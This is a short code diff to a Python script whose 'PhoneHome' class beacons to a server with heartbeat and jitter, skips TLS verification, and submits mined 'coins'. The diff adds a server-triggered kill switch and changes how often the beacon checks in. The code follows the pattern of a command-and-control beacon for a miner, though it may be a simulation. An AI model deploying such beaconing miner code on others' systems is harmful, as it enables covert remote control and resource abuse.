@@ -14,7 +14,9 @@ from collections import deque
 import urllib3
 import select
 import platform
-
+import sys
+# ========== IMPORTS ==========
+# Suppress SSL warnings
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -48,6 +50,7 @@ class PhoneHome:
     def __init__(self):
         self.heartbeat = 30
         self.jitter = 15
+        self.kill = False
 
     def fetch_beacon_config(self, miner_id):
         url_ext = "check/"
@@ -75,6 +78,12 @@ class PhoneHome:
                 json=payload,
                 verify=False,
                 )
+            r.raise_for_status()
+            p = r.json()
+            if p['kill']:
+                self.kill = True
+                logger.info("[!] Received kill signal from server.")
+                sys.exit(0)
             logger.info(f"[+] Submitted coin: {r.text}")
         except Exception as e:
             logger.error(f"[-] Failed to submit coin: {e}")
@@ -136,12 +145,12 @@ file_stack = FileStack()
 def mining_loop(miner_id, stop_event):
     beacon = PhoneHome()
     miner = CoinMiner()
-    beacon_time = datetime.datetime.now()
+    beacon.fetch_beacon_config(miner_id)
 
     while not stop_event.is_set():
-        if datetime.datetime.now() >= beacon_time:
-            beacon.fetch_beacon_config(miner_id)
-            beacon_time = beacon.get_next_checkin_time()
+        # if datetime.datetime.now() >= beacon_time:
+        #     beacon.fetch_beacon_config(miner_id)
+        #     beacon_time = beacon.get_next_checkin_time()
 
         digest = miner.mine()
         if miner.meets_target(digest):
